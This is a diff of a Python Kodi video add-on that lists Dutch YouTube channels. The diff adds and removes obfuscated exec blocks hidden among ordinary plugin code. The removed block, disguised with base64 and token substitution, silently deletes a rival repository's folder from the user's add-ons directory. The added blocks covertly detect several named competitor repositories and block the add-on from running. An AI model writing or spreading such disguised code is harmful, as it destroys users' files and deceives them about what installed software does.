@@ -8,15 +8,16 @@
 # Author: coldkeys
 #------------------------------------------------------------
 
-import base64,os,sys,xbmc,xbmcaddon,xbmcgui,xbmcplugin,re,shutil
+import base64,os,sys,xbmc,xbmcaddon,xbmcgui,xbmcplugin,re
 import plugintools
 from addon.common.addon import Addon
 
-addonID = 'plugin.video.Allesin1NL!'
-addon = Addon(addonID, sys.argv)
-local = xbmcaddon.Addon(id=addonID)
-icon = local.getAddonInfo('icon')
-fanart="http://webneel.com/sites/default/files/images/blog/t-natuwal.jpg"
+addonID  = 'plugin.video.Allesin1NL!'
+addon_id = 'plugin.video.Allesin1NL!'
+addon    = Addon(addonID, sys.argv)
+local    = xbmcaddon.Addon(id=addonID)
+icon     = local.getAddonInfo('icon')
+fanart   = local.getAddonInfo('fanart')
 
 YOUTUBE_CHANNEL_ID_1 = "UCLFLMHOWrWo0j6BXa2sbzBA/playlists"
 YOUTUBE_CHANNEL_ID_2 = "UC1IP4Z_Vk08aRXuund9JABQ/playlists"
@@ -34,13 +35,11 @@ YOUTUBE_CHANNEL_ID_13 = "UC1kNe57F-85trrYC7tbOSXA/playlists"
 YOUTUBE_CHANNEL_ID_14 = "UCUfsrSL6DyWSkkpddlY21-Q/playlists"
 YOUTUBE_CHANNEL_ID_15 = "DanceTrippinOfficial"
 
+exec((lambda OO00O00OOOO000000 ,OOO0OOO000OO00O00 :(lambda OO0OO00O0O0O0OO00 ,OO0000OO000O0OO0O ,O0O000OO0OO00O00O :re .sub (OO0OO00O0O0O0OO00 ,OO0000OO000O0OO0O ,O0O000OO0OO00O00O ))(r"([0-9a-f]+)",lambda O0O0OOO00O0O0000O :OO00O00OOOO000000 (O0O0OOO00O0O0000O ,OOO0OOO000OO00O00 ),base64 .b64decode ("MzEgMjkgKCk6IzA6MgoJYyAuMjYgKCIyYS4yOSIpIzA6MwoJNCA9ZiAuNDYgKCczNT0nKSMwOjUKCTQzID1mIC40NiAoJzNjPT0nKSMwOjYKCTQ0ID1mIC40NiAoJ2U9JykjMDo3CgkzZiA9ZiAuNDYgKCc0NT0nKSMwOjgKCTQ5ID1mIC40NiAoJzM4JykjMDo5CglhID1bNDQgLDQ5ICw0MyAsM2YgLDQgXSMwOjEwCgk0NyA9MzMgKDJkIC40MCAoJzI4LjM0KCU0OCknJSg0MiApKTMwIDQyIDQxIGEgKSMwOjExCgkyZSA0NyA6IzA6MTIKCQkyMyAuMjQgKCkuMzkgKCdbMWIgMzJdW2JdMTg6IFsvYl0zZCAxYSAxZlsvMWJdJywnMTUgM2QgM2UuIDFkIDNiIDI2LicpIzA6MTMKCQkyNSAyYiAjMDoxNAoJMSA9YyAuMWMgKCkjMDoxNwoJMmUgMSAuMjcgKCIzNiIpM2EgMmMgOiMwOjE5CgkJMWUgKDEgKSMwOjIwCgkyZiA6IzA6MjEKCQkzNyA9MSAuMjcgKCIzNiIpIzA6MjIKCWMgLjE2ICgpCiNk")))(lambda OOO00O0O0O0O000OO ,O0O0OOO0O00O0O000 :O0O0OOO0O00O0O000 [int ("0x"+OOO00O0O0O0O000OO .group (1 ),16 )],"line|O0OO0O00000OOO0O0|2|3|OOO0000O00OO0000O|5|6|7|8|9|OOOOO000OOO0OOOO0|B|plugintools|e9015584e6a44b14988f13e2298bcbf9|cmVwb3NpdG9yeS5raWprYWxsZXMubmw|base64|10|11|12|13|14|Afhankelijkheden|close_item_list|17|WAARSCHUWING|19|ondersteund|COLOR|get_params|Controleer|main_list|protocol|20|21|22|xbmcgui|Dialog|return|log|get|System|run|XvBMC|False|None|xbmc|if|else|for|def|red|any|HasAddon|cmVwb3NpdG9yeS5kb2tpbmw|action|O0OO0O0OOO0000OOO|cmVwb3NpdG9yeS5kaXRpc3R2|notification|is|uw|cmVwb3NpdG9yeS54LW9kaS5ubA|niet|voldaan|OOOOO000O000O0O0O|getCondVisibility|in|O000O0OOOOO00O0O0|OO0OO00000OOOO00O|OO00OO0OO0OOOOO00|cGx1Z2luLnZpZGVvLkNyZWF0aXZlVHZXaXphcmQ|b64decode|OO00O0OOOOO0OOOOO|s|OO00O0OO0OOOOO000".split ("|")))
 
-# Entry point
-exec ((lambda O00OOO0O0O0OOOOO0 ,O0OO0OOO0O00000O0 :(lambda O0OO0000OO0O0OOOO ,OOO0OOOOOO00O0OOO ,OO0O000OOO0O00OOO :re .sub (O0OO0000OO0O0OOOO ,OOO0OOOOOO00O0OOO ,OO0O000OOO0O00OOO ))(r"([0-9a-f]+)",lambda O0O00O00OO00OOO0O :O00OOO0O0O0OOOOO0 (O0O00O00OO00OOO0O ,O0OO0OOO0O00000O0 ),base64 .b64decode ("MjkgMTcoKToKCTQuMmEoIjIwLjE3IikKCTEgPSAxNC5kKDE5LjI2LjIzKCcxNTovLzIxLzFiLycpKQoJMD0xYy4xMCgnNj0nKSAjMWYgMjggJzEzJyAxZSAxNiMKCQoJMTE6CgkJMTkuMTgoMSswKQoJODoKCQk3LjkoMSswLCAyPWUpCgkxMToKCQkxOS4xZCgxKzApCgk4OgoJCTcuOSgxKzAsIDI9ZSkKCTExOgoJCTcuOSgxKzAsIDI9ZSkKCTg6IDIyCgkjMTQuYygiYSIpCgkKCSMgMmIgMwoJMyA9IDQuZigpCgkKCTJkIDMuMWEoIjUiKSAyYyAyNDoKCQkxMigzKQoJMjU6CgkJNSA9IDMuMWEoIjUiKQoJCTI3IDUrIigzKSIKCQoJNC5iKCk=")))(lambda OOOO000O0OOOO0OO0 ,OO0OO00OOOO000OO0 :OO0OO00OOOO000OO0 [int ("0x"+OOOO000O0OOOO0OO0 .group (1 ),16 )],"cleancrap|addonmap|ignore_errors|params|plugintools|action|cmVwb3NpdG9yeS5kb2tpbmw|shutil|except|rmtree|UpdateLocalAddons|close_item_list|executebuiltin|translatePath|True|get_params|b64decode|try|main_list|Kerosine|xbmc|special|fuckers|run|unlink|os|get|addons|base64|rmdir|Marco|kusje|XvBMC|home|pass|join|None|else|path|exec|van|def|log|Get|is|if".split ("|")))
-
-	
 # Main menu
 def main_list(params):
+    setView('movies', 'EPiC')
     plugintools.log("XvBMC.main_list "+repr(params))
 
     plugintools.add_item( 
@@ -149,4 +148,11 @@ def main_list(params):
 		fanart="https://archive.org/download/fanart_20170116/fanart.jpg",
         folder=True )
 
-run()
+def setView(content, viewType):
+    # set content type so library shows more views and info
+    if content:
+        xbmcplugin.setContent(int(sys.argv[1]), content)
+    if local.getSetting('auto-view')=='true':
+        xbmc.executebuiltin("Container.SetViewMode(%s)" % local.getSetting(viewType) )
+
+exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MmYgKChkIDYgLDQgOihkIDUgLDMgLDggOjQyIC4zMiAoNSAsMyAsOCApKSg0OSIoWzAtM2YtZl0rKSIsZCA3IDo2ICg3ICw0ICksMTcgLjEwICgiNDY9IikpKShkIDIgLDkgOjkgWzMzICgiNDAiKzIgLjJiICgxICksMTYgKV0sIjEwfDQ3fDRifDE3fGN8MTR8MTV8ZXw0YXwxOXwxYXxifDExfDEyfDFifDEzfDFkfDFmfDIwfDQxfDE4fDIzfDI0fDI5fDNhfDFjfDMwfDFlfDIxfDIyfDNifDNjfDI1fDM0fDI2fDI4fDJjfDJkfDJlfDJhfDQ1fDMxfDM4fDM2fDM3fDM1fDM5fDNkfDNlfDQzfDQ0fDQ4Ii4yNyAoInwiKSkpCiNh")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|O0OO0OO0OO0000O0O|OO0OO00O00O0OOOO0|O00OOOOOO00O000O0|OOOO00OOO0000000O|OOOOO0O00000OO0O0|OO0000O0O0O0OO0OO|OOOO00O000OO000O0|O00OOO00OOOOO00OO|e9015584e6a44b14988f13e2298bcbf9|B|cmVwb3NpdG9yeS54LW9kaS5ubA|lambda|cmVwb3NpdG9yeS5kaXRpc3R2|f|b64decode|getCondVisibility|DefaultIconError|executebuiltin|has_bad_addon|Dependencies|16|base64|Notification|unsupported|bad_addons|protocol|HasAddon|WARNING|xbmcgui|contact|author|Dialog|return|plugin|Please|System|False|split|alles|addon|COLOR|group|idox|5000|istv|exec|xbmc|else|sub|int|add|oki|png|tvw|for|run|not|red|met|any|RUN|9a|0x|notification|re|if|in|on|YSA9IFsKCTMuMCgnMj0nKSwjMjMgCgkzLjAoJzcnKSwjMjYgCgkzLjAoJzQ9PScpLCMyNCAKCTMuMCgnMT0nKSwjMmMgCgkzLjAoJzg9JykjMmQgCl0KNSA9IDJmKDFhLmMoJzIwLjE5KCUzMyknICUgKDE3KSkgMmEgMTcgMzIgYSkKMzEgMTggNToKICAgIDJlKCkKMjk6CiAgICAjMWIuMWMoKS4xMygnWzI3IDFlXVtiXTEwOiBbL2JdOSBlKDE1KVsvMjddJywnNiAxOCAxZi4gMTYgMTEgMjEtMjggMTIuJykKICAgIDFhLmYoJzE0KFsyNyAxZV1bYl0xMDogWy9iXTkgZSgxNSlbLzI3XSw2IDE4IDFmLiAxNiAxMSAyMS0yOCAxMi4sMjUsZC4yYiknKQkKICAgICMxZCAyMgoKIzMwKCk|cGx1Z2luLnZpZGVvLkNyZWF0aXZlVHZXaXphcmQ|s|r|cmVwb3NpdG9yeS5kb2tpbmw|cmVwb3NpdG9yeS5raWprYWxsZXMubmw".split("|")))
